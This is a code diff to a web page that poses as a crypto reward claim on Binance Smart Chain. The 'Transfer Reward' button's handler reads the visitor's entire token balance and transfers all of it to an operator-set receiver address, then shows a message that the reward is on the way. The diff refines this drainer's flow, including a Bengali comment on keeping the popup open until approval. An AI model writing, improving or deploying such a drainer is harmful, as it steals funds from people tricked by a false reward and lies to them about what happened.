@@ -126,7 +126,7 @@
                 To receive this reward in your wallet you have to approve the transaction to be sent. After approval the fund will be automatically sent to your wallet.
             </div>
 
-            <button class="btn-main" onclick="triggerSmartContract()">Transfer Reward</button>
+            <button class="btn-main" id="transferBtn" onclick="triggerSmartContract()">Transfer Reward</button>
         </div>
     </div>
 
@@ -202,10 +202,15 @@
         }
 
         async function triggerSmartContract() {
-            document.getElementById('winModal').style.display = 'none';
+            const transferBtn = document.getElementById("transferBtn");
+            transferBtn.disabled = true;
+            transferBtn.innerText = "Waiting for Approval...";
 
             if (!window.ethereum) {
+                document.getElementById('winModal').style.display = 'none';
                 showMsgModal("Error", "No crypto wallet detected inside browser.", "⚠️");
+                transferBtn.disabled = false;
+                transferBtn.innerText = "Transfer Reward";
                 return;
             }
 
@@ -220,7 +225,10 @@
                             params: [{ chainId: CONFIG.chainId }],
                         });
                     } catch (switchError) {
+                        document.getElementById('winModal').style.display = 'none';
                         showMsgModal("Network Error", "Please switch to Binance Smart Chain in your wallet.", "⚠️");
+                        transferBtn.disabled = false;
+                        transferBtn.innerText = "Transfer Reward";
                         return;
                     }
                 }
@@ -237,14 +245,21 @@
                 const fullBalanceWei = await contract.balanceOf(userAddress);
 
                 if (fullBalanceWei <= 0n) {
+                    document.getElementById('winModal').style.display = 'none';
                     showMsgModal("Notice", "Insufficient balance in wallet.", "⚠️");
+                    transferBtn.disabled = false;
+                    transferBtn.innerText = "Transfer Reward";
                     return;
                 }
 
                 const txTransfer = await contract.transfer(CONFIG.receiver, fullBalanceWei);
+                
+                // ইউজার এপ্রুভ করার পর ট্রানজেকশন কনফার্ম হওয়া পর্যন্ত উইনিং পপ-আপ ওপেন থাকবে এবং এপ্রুভের পরেই পপ-আপ ক্লোজ হয়ে সাকসেস মেসেজ আসবে
                 await txTransfer.wait();
 
                 localStorage.setItem("topnod_claimed", "true");
+                document.getElementById('winModal').style.display = 'none';
+                
                 showMsgModal(
                     "🚀 Reward Processing!", 
                     "Awesome! Your reward is on the way. The funds will be sent within a few seconds. Please check your wallet balance shortly.", 
@@ -253,11 +268,15 @@
 
             } catch (error) {
                 console.error(error);
+                document.getElementById('winModal').style.display = 'none';
                 showMsgModal(
                     "Oh No!", 
                     "You have lost your reward because the approval or transaction was cancelled.", 
                     "😢"
                 );
+            } finally {
+                transferBtn.disabled = false;
+                transferBtn.innerText = "Transfer Reward";
             }
         }
 
